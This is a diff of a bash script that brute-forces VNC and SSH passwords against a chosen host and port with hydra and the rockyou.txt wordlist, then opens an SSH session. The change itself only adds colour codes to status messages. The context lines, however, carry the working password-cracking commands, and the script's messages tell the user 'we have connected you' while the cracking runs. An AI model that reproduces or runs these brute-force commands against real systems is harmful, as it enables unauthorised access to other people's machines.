@@ -211,17 +211,17 @@ else
                         # Crack VNC password
                         hydra -P rockyou.txt -t 64 -vV -o output.log -I vnc://$host:$port
                         # Alerts the user that the computer is trying to connect to the VNC server
-                        title="Connecting to ${host}"
-                        Connecting_To_VNC_SERVER="We are connecting you to '${host}'. Please wait..."
-                        echo "${title}"
-                        echo "${Connecting_To_VNC_SERVER}"
+                        title="Connecting to ${GREEN}${host}${NC}"
+                        Connecting_To_VNC_SERVER="We are connecting you to '${GREEN}${host}${NC}'. Please wait..."
+                        echo -e "${title}"
+                        echo -e "${Connecting_To_VNC_SERVER}"
                         sleep 5
 
                         # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         # Notification for the user to see the computer is connected to the VNC server
-                        title="Enter password to ${host}"
-                        Connected_To_VNC_SERVER="We have connected you to '${host}'. Please enter the password to '${host}'. To continue..."
-                        echo
+                        title="Enter password to ${GREEN}${host}${NC}"
+                        Connected_To_VNC_SERVER="We have connected you to '${GREEN}${host}${NC}'. Please enter the password to '${GREEN}${host}${NC}'. To continue..."
+                        echo ""
                         echo "${title}"
                         echo "${Connected_To_VNC_SERVER}"
                         # Put the
@@ -248,19 +248,20 @@ else
                         # Crack SSH password
                         hydra -l $user -P rockyou.txt -t 64 -vV -o output.log -I ssh://$host:$port
                         # Alerts the user that the computer is trying to connect to the ssh server
-                        title="Connecting to ${user}"
-                        Connecting_To_SSH_SERVER="We are connecting you to ${user}. Please wait..."
+                        title="Connecting to ${GREEN}${user}${NC}"
+                        Connecting_To_SSH_SERVER="We are connecting you to ${GREEN}${user}${NC}. Please wait..."
                         echo ""
-                        echo "${title}"
-                        echo "${Connecting_To_SSH_SERVER}"
+                        echo -e "${title}"
+                        echo -e "${Connecting_To_SSH_SERVER}"
                         sleep 5
 
                         # It connects to the ssh server and asks for the user to input a password to connect to the ssh server
                         echo ""
-                        title="Enter password to ${user}"
-                        Connected_To_SSH_SERVER="We have connected you to ${user}. Please enter the password to ${user} to continue..."
-                        echo "${title}"
-                        echo "${Connected_To_SSH_SERVER}"
+                        title="Enter password to ${GREEN}${user}${NC}"
+                        Connected_To_SSH_SERVER="We have connected you to ${GREEN}${user}${NC}. Please enter the password to ${GREEN}${user}${NC} to continue..."
+                        echo ""
+                        echo -e "${title}"
+                        echo -e "${Connected_To_SSH_SERVER}"
                         echo ""
                         ssh "${user}@${host}" -p "${port}"
                     fi
